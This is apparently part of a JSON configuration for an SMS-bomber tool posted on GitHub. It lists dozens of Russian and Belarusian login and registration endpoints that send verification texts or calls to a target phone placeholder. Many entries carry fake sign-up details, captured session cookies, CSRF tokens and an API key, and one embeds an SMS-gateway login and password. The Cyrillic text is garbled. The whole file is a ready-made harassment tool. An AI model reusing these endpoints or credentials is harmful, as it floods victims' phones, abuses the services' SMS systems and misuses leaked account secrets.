        "data": "{'userPhone': '*phone()*', 'SITE_ID': 's1', 'sessid': ''}",
        "response": 200,
        "timeout": 60,
        "cookies": "https://zdesapteka.ru/"
      },
      "stockmann": {
        "url": "https://stockmann.ru/ajax/?controller=user&action=registerUser&surname=Popovich&name=Oleg&phone=*phone3*&email=rgeaefs@gmail.com&password=123456&password_confirm=123456",
        "response": 200,
        "timeout": 600
      },
      "SberUslugi": {
        "url": "https://sberuslugi.ru/api/v1/user/secret",
        "data": "{'phone': '*phone()*'}",
        "response": 200,
        "timeout": 180
      },
      "victoria": {
        "url": "https://new.victoria-group.ru/api/v2/manzana/Identity/RequestAdvancedPhoneEmailRegistration",
        "response": 200,
        "timeout": 60
      },
      "sunlight": {
        "url": "https://api.sunlight.net/v3/customers/authorization/",
        "json": "{'phone':'*phone*'}",
        "response": 200,
        "timeout": 30,
        "cookies": "https://sunlight.net/profile/login/?next_encoded=Lw=="
      },
      "ok.ru": {
        "url": "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
        "data": "{'st.r.phone': '*phone*'}",
        "response": 200,
        "timeout": 60,
        "cookies": "https://ok.ru/"
      },
      "citystar": {
        "url": "https://citystarwear.com/bitrix/templates/bspc/php/bs.auth.sms/templates/pc/handlers.php",
        "data": "{'hdlr': 'bsSendCodeAuth','bshsmsk': 'h5Plm22xoaFs9YTp', 'phone': '*-phone*', 'xemail': '', 'xphone': ''}",
        "response": 200,
        "timeout": 180
      },
      "beerlogapizza": {
        "url": "https://smsc.ru/sys/send.php",
        "data": "{'login': 'beerlogaa@gmail.com', 'psw': 'QWE780p', 'phones': '*+phone*', 'mes': 'code', 'call': '1', 'fmt': '3'}",
        "response": 201,
        "timeout": 60,
        "cookies": "https://beerlogapizza.ru/login/"
      },
      "pizzamia": {
        "url": "https://1603.smartomato.ru/account/session",
        "data": "{'g-recaptcha-response': 'null','phone': '*phone3*'}",
        "response": 200,
        "timeout": 60
      },
      "wildberries": {
        "url": "https://authorization.wildberries.eu/api/v2/code/request",
        "json": "{\"contact\": \"*phone*\", \"auth_method\": \"sms\", \"lang\": \"ru\"}",
        "response": 200,
        "timeout": 60
      },
      "findclone": {
        "url": "https://findclone.ru/register",
        "data": "{'phone': '*phone*'}",
        "response": 200,
        "timeout": 60,
        "GET": ""
      },
      "tashirpizza": {
        "url": "https://tashirpizza.ru/ajax/mindbox_register",
        "data": "{'phone': '*phone()*', 'fio': 'ÐžÐ»ÐµÐ³ ÐžÐ»ÐµÐ³Ð¾Ð² ÐžÐ»ÐµÐ³Ð¾Ð²Ð¸Ñ‡', 'bd': ''}",
        "response": 200,
        "timeout": 60
      },
      "my-shop": {
        "url": "https://my-shop.ru/cgi-bin/my_util2.pl?q=my_code_for_phone_confirmation&view_id=d51a4d42-c5e8-43ce-a24d-383a3b29f17ae821ed918",
        "json": "{'phone_code': '7', 'phone': '*-phone*'}",
        "response": 200,
        "timeout": 60
      },
      "bisonpizza": {
          "url": "https://bizonpizza.ru/api/auth/send-sms-verification-code",
          "json": "{'phoneNumber': '*+phone*'}",
          "response": 200,
          "timeout": 60
      },
      "magnitapteka": {
        "url": "https://apteka.magnit.ru/api/personal/auth/code/",
        "data": "{'phone': '*phone*'}",
        "response": 200,
        "timeout": 60
      },
      "eldorado": {
        "url": "https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php",
        "json": "{'user_login': '*eldarado*'}",
        "response": 200,
        "timeout": 60
      },
      "kent": {
        "url": "https://kent.ru/api/send-confirm?qr=",
        "json": "{'type': 'sms', 'contact': '*phone*', 'case': 'register'}",
        "response": 200,
        "timeout": 60
      },
      "polyana1c": {
        "url": "https://polyana1c.ru:25101/CRM/hs/pd/auth/send-code",
        "json": "{'phoneNumber': '*+phone*'}",
        "response": 200,
        "timeout": 600
      },
      "citystarwear": {
        "url": "https://m.citystarwear.com/bitrix/templates/bs-base/php/includes/bs-handlers.php",
        "data": "{'hdlr': 'bsAuthSendCode', 'key': 'DOvBhIav34535434v212SEoVINS', 'phone': '*-phone*', 'pcode': '7', 'vphone': '*-phone*'}",
        "response": 200,
        "timeout": 180,
        "headers": {
          "cookie": "_ga=GA1.2.1427439092.1661873883; tmr_lvid=7f1742aab6354e49610b859181e4cd90; tmr_lvidTS=1661873883545; BX_USER_ID=5e66c0741eefeeba48abfe666e49687a; _ym_uid=1661873884168755235; _ym_d=1661873884; _tt_enable_cookie=1; _ttp=01839738-27cc-4c5b-ae4a-be99662bcaf5; I_BITRIX2_SM_bsAuthPhone=9502135308; PHPSESSID=NNGLA4WVIkGxrlj8zMwacQQ75E9g7b6R; I_BITRIX2_SM_bsSiteVersionRun=D; I_BITRIX2_SM_SALE_UID=66dde7a489d38a413233c60f5ea227bd; _gid=GA1.2.85927779.1667044483; _ym_isad=1; _ym_visorc=w; I_BITRIX2_SM_BSPopUpBnr=%7B%2296591%22%3A1667130902%7D; tmr_detect=1%7C1667044505998; cto_bundle=qQMtx19qZFFHeFglMkJRQlNMcTBIUGR4VG9Rc3pLJTJCb2FaaFFyR2hndVh1azY2elRHZ1Zrbk1wZGJFTiUyQjFWJTJCQjdWQnRRb25XTnpsaDk5RGFuYWRhN3ZVWkJ3MURwbWIzUjVGem0lMkJrQUFKd25VaTVGV3FOS0pCak5ET0hLMU0lMkJqanVTRk9uZVREeG14anF4NnMzRzk5JTJGJTJGVEI3c1dJJTJCQmNTUGp4aWJWbFFXTWozb1lzQnMlM0Q; tmr_reqNum=16"
        }
      },
      "vardex": {
        "url": "https://www.vardex.ru/bitrix/services/main/ajax.php?mode=class&c=vardex%3Amain.auth&action=sendConfirmCode",
        "json": "{'phone': '*vardex*', 'new': 'false'}",
        "response": 200,
        "timeout": 120,
        "headers": {"x-bitrix-csrf-token": "1023f1844f62f888d4b35f1e39e306fb", "x-bitrix-site-id": "s1", "cookie": "PHPSESSID=4npNhUXACzFbLeO0SZR1ZRfUu6rnJzzr; REFERER=https%3A%2F%2Fwww.google.com%2F; LANDING_PAGE=%2Findex.php; USER_CITY_ID=997; BITRIX_SM_SALE_UID=90053950; BITRIX_SM_PK=997; _ga=GA1.2.1040077275.1667045453; _gid=GA1.2.448176478.1667045453; rrpvid=492574795716432; rcuid=62f1473f2534d0f27d07c026; _gat=1; _userGUID=0:l9tvtkhg:axyo7jLYuXeLgyy0~bEB0Fh2vUfUndzQ; dSesn=42427647-2094-beb6-f85a-f4b090bb4a67; _dvs=0:l9tvtkhg:oQ517cjrDOXBxqpjE34iDqzPYNcspDq3; _ym_uid=1667045454951407587; _ym_d=1667045454; BX_USER_ID=5e66c0741eefeeba48abfe666e49687a; _ym_isad=1; _ym_visorc=b; rrwpswu=true; rrwpswu=true; BITRIX_SM_AGREE18PLUS=1"}
      },
      "tinkoff": {
        "url":  "https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",
        "data": "{'phone': '*phone*'}",
        "response": 200,
        "timeout": 60
      },
      "sipnetru": {
        "url": "https://register2.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&callmode=1&phone=*phone*",
        "response": 200,
        "timeout": 60
      },
      "vesnashop": {
        "url": "https://vesna.shop/bitrix/components/splash/auth/ajax.php",
        "data": "{'type': 'auth','phone': '*vardex*','vtr': ''}",
        "response": 200,
        "timeout": 60,
        "headers": {"Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Encoding": "gzip, deflate, br",
          "Accept-Language": "ru,en;q=0.9", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "referer": "https://vesna.shop/", "User-Agent": "", "x-requested-with": "XMLHttpRequest"
        }
      },
      "beeline": {
        "cookies": "https://podarki.beeline.ru/",
        "url": "https://g1.accelera.ai/api/auth/",
        "json": "{'ctn': '*phone*', 'fingerprint': {'fingerprint': '2584445951', 'browser': 'Yandex','OS': 'Windows','osVersion': '10'}}",
        "response": 200,
        "timeout": 120,
        "headers": {"Accept": "*/*", "Accept-Encoding": "gzip, deflate", "Accept-Language": "ru-RU,ru;q=0.9", "Authorization": "Key xPCYYlvB_5zKab4WztOFpDo1mngaEM889N5k7vhY", "User-Agent": ""}
      },
      "lentacom": {
        "url": "https://lenta.com/api/v1/authentication/loginotp",
        "json": "{'phoneNumber': '*-phone*', 'ksid': 'L!be0e73c0-b0cf-8a67-7047-cfebc7980a66_0'}",
        "response": 200,
        "timeout": 120,
        "headers": {"Content-Type": "application/json", "Cookie": ".ASPXANONYMOUS=3tDE0AC2uvhFm3uC-YRc_KI0q9uBNLz9Ec4kmSBD7ntbWKeUN-3KHTjqJ1sVUr_LoISE6Bq1SHJ-3T15d72HHQN2qB7uygoR8LLmhS54qFI6fwVzJ2wYdFNDxHhncaTmTy0s4w2; ASP.NET_SessionId=pp3xdccr04p0f3sbbvcpnmkm; cookiesession1=678B286DYACEGIKMOQTV135799136195; qrator_msid=1661604969.016.eAzg9BjVxFAQL6MS-mc8sqefejtnimm4qo24ua0msuqf1c4ld; CustomerId=0ab9e642fada4c009fb2450befa67dfc; ShouldSetDeliveryOptions=True; DontShowCookieNotification=true; _tm_lt_sid=1661604972717.961622; _ym_uid=1661604974484496117; _ym_d=1661604974; _ym_isad=1; _gcl_au=1.1.852215224.1661604974; _ym_visorc=b; KFP_DID=81e58c9b-1e87-90a6-400e-1d6c30362daf; tmr_lvid=774e77c95e64544af8cf20944dff2c27; tmr_lvidTS=1661604976734; _ga=GA1.2.405490698.1661604977; _gid=GA1.2.694431860.1661604977; _dc_gtm_UA-327775-35=1; _gat_UA-327775-1=1; _tt_enable_cookie=1; _ttp=3446eba5-cc09-4cc8-b177-a329df01a686; flocktory-uuid=9f7056ce-8593-4b0a-b973-f7e1b0e913a3-8; _gat_UA-327775-30=1; tmr_detect=1%7C1661604983109; tmr_reqNum=8; oxxfgh=L!be0e73c0-b0cf-8a67-7047-cfebc7980a66#1#1800000#5000#1800000#44965", "User-Agent": ""}
      },
      "mygames": {
        "url": "https://account.my.games/signup_phone_init/",
        "json": "{'csrfmiddlewaretoken': '','client_id': 'games.my.com','continue': 'https://store.my.games/','lang': 'ru_RU','adId': '0','phone': '*phone*','password': 'zku-SmR-c6k-sg6','method': 'phone'}",
        "response": 200,
        "timeout": 300,
        "headers": {
          "Content-Type": "application/json", "cookie": "_ym_uid=1654025467684831506; _ym_d=1654025467; _gcl_au=1.1.977496090.1654025467; _ym_visorc=w; _ym_isad=1; tmr_lvid=1f2ee5766691696cc38805c612b2b44d; tmr_lvidTS=1654025473108; _ga=GA1.2.563371938.1654025476; _gid=GA1.2.1260702696.1654025476; __cmpconsentx36623=BPZ4E9UPZ4E9UAfJvBRUDXAAAABCqABAhUA; __cmpcccx36623=aBPZ4E9UgAwAzADcAoAAIAAwADgAXAA0AB4AQ4BGgHEgWBABGDEA; _gat_UA-141226752-1=1; tmr_reqNum=5; amc_lang=ru_RU", "User-Agent": ""}
      },
      "apteka-ot-sklada": {
        "url": "https://apteka-ot-sklada.ru/api/auth/request",
        "json": "{'phone': '*phone*'}",
        "headers": {"Cookie": "view=cells; rrpvid=182985917812810; _ym_uid=1669397180778917572; _ym_d=1669397180; rcuid=62f1473f2534d0f27d07c026; _gid=GA1.2.1728524294.1669397180; _gat_gtag_UA_65450830_1=1; _ym_isad=1; _userGUID=0:lawrz8ev:UsfWVO0CgBe11ZeAri~XTvEKs~tt6Rs1; dSesn=50a7f5f6-15e3-8c2e-6d20-bb38a05cedb1; _dvs=0:lawrz8ev:mJriWOB42pmlP8KgjY8hx~ZuJyQlg3VG; _ym_visorc=b; tmr_lvid=fa4817f671d93bd212f0cff6b80fec1d; tmr_lvidTS=1669397180605; mark=3a6e6f49-3648-4ab4-ac78-fad19282326a; _ga_6C350KZVLV=GS1.1.1669397181.1.0.1669397181.0.0.0; _ga=GA1.1.1801205636.1669397180; tmr_detect=1%7C1669397181519; rrwpswu=true; city=41", "User-Agent": ""},
        "timeout": 30,
        "response": 200
      },
      "smartmed": {
        "url": "https://online.smartmed.pro/personal/api/users/register/v2",
        "json": "{'address': 'null', 'birthday': '1991-11-11','email': 'dasdbt325@mail.ru', 'firstName': 'ÐžÐ»ÐµÐ³','gender': '1','lastName': 'Ð¾Ð»ÐµÐ³Ð¾Ð²Ð¸Ñ‡','password': '1234nyrmyx','patientTypeForRegistration': '1','patronymic': 'ÐžÐ»ÐµÐ³','phone': '*phone*', 'termsOfUse': [{'code': '1','value': 'true'}],'withoutPatronymic': 'false'}",
        "headers": {"Application-Version": "2.2.0", "Content-Type": "application/json", "Timezone-Offset": "300", "User-Agent": ""},
        "response": 200,
        "timeout": 60
      }
    }
  ],
  "by":
  [
    {
     "telegram_by": {
       "url": "https://my.telegram.org/auth/send_password",
       "data": "{'phone': '*+phone*'}",
       "response": 200,
       "timeout": 120
      },
     "green_by": {
       "url": "https://www.green-market.by/registration_send_sms_code",
       "data": "{'phone': '*green*'}",
       "headers": {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7", "Cache-Control": "no-cache", "Connection": "keep-alive", "User-Agent": "", "X-CSRF-TOKEN": "", "X-Requested-With": "XMLHttpRequest"},
       "response": 200,
       "timeout": 60,
       "cookies": "https://www.green-market.by/"
     },
      "ok.ru_by": {
        "url": "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
        "data": "{'st.r.phone': '*+phone*'}",
        "response": 200,
        "timeout": 60,
        "cookies": "https://ok.ru/"
      },
      "sosedi_by": {
        "url": "https://sosedi.by/local/api/smsSend.php",
        "json": "{'phone':'*sosedi*'}",
        "response": 200,
        "timeout": 60,
        "cookies": "https://sosedi.by/"
      },
      "av.by_by": {
        "url": "https://api.av.by/auth/phone/sign-up",
        "json": "{\"name\":\"ÐžÐ»ÐµÐ³\",\"password\":\"HifbWy523i46oO\",\"phone\":{\"country\":1,\"number\":\"*-phone*\"},\"userEula\":{\"accepted\":true}}",
        "response": 204,
        "timeout": 60,
        "cookies": "https://av.by"
      },
      "carte_by": {
        "url": "https://carte.by/auth/",
        "data": "{'ajax': 'register', 'login': 'Olegkiller229', 'pass': 'CbivnE5316', 'phone': '*+phone*', 'code': '', 'company': 0, 'resend': 1, 'checksum': 675}",
        "response": 200,
        "timeout": 30,
        "cookies": "https://carte.by/"
      },
      "delivio_by": {
        "url": "https://delivio.by/be/api/register",
        "json": "{'phone': '*+phone*'}",
        "response": 201,
        "timeout": 60,
        "cookies": "https://delivio.by/"
      },
      "wildberries_by": {
        "url": "https://authorization.wildberries.eu/api/v2/code/request",
        "json": "{\"contact\": \"*phone*\", \"auth_method\": \"sms\", \"lang\": \"ru\"}",
        "response": 200,
        "HZF": "Ð½Ðµ ÑƒÐ¼ÐµÐµÑ‚ Ð´Ð¾Ð±Ð°Ð²Ð»ÑÑ‚ÑŒ ÑÐµÑ€Ð²Ð¸ÑÑ‹, Ð¸ Ð»ÐµÐ³ÐºÐ¾ ÑÐ»Ð¸Ð²Ð°ÐµÑ‚Ñ, Ð¸ Ð²Ð°Ñ‰Ðµ Ð¾Ð½ Ð¿Ð¾Ð»ÑƒÐ´ÑƒÑ€Ð¾Ðº ÐºÐ¾Ð¿Ñ‡ÐµÐ½Ñ‹Ð¹",
        "timeout": 60
      },
      "findclone_by": {
        "url": "https://findclone.ru/register",
        "data": "{'phone': '*phone*'}",
        "response": 200,
        "timeout": 60,
        "GET": ""
      },
      "mygames_by": {
        "url": "https://account.my.games/signup_phone_init/",
        "json": "{'csrfmiddlewaretoken': '41r1HINGrjawyMvEtmxnxUIKhPPaYO88EEcCrS39GlFS0qjpSfDPrQwynsf9AgnE', 'continue': 'https://account.my.games/profile/userinfo/', 'lang': 'ru_RU', 'adId': '0', 'phone': '*phone*', 'password': 'aVWwv352', 'method': 'phone'}",
        "response": 200,
        "timeout": 300,
        "headers": {
          "Content-Type": "application/json", "cookie": "tmr_lvid=8486d72df1bd0454f40766848fee4a87; tmr_lvidTS=1669395712200; _gcl_au=1.1.429924486.1669395712; _ym_uid=1669395712518165517; _ym_d=1669395712; _ym_isad=1; _ga=GA1.2.1385546992.1669395713; _gid=GA1.2.1310932677.1669395713; _ym_visorc=b; __cmpconsentx36623=BPjCZIxPjCZIxAfJvBRUDXAAAAAAAA; __cmpcccx36623=aBPjCZIxgAgAzADAAuA4kCwIAIwYgA; csrftoken=41r1HINGrjawyMvEtmxnxUIKhPPaYO88EEcCrS39GlFS0qjpSfDPrQwynsf9AgnE; amc_lang=ru_RU; act=1eG9Q4dehyq9twI0", "User-Agent": ""}
      }
    }
  ]
}
Footer
Â© 2022 GitHub, Inc.
Footer navigation
Terms
Privacy
Security
Status
Docs
Contact 
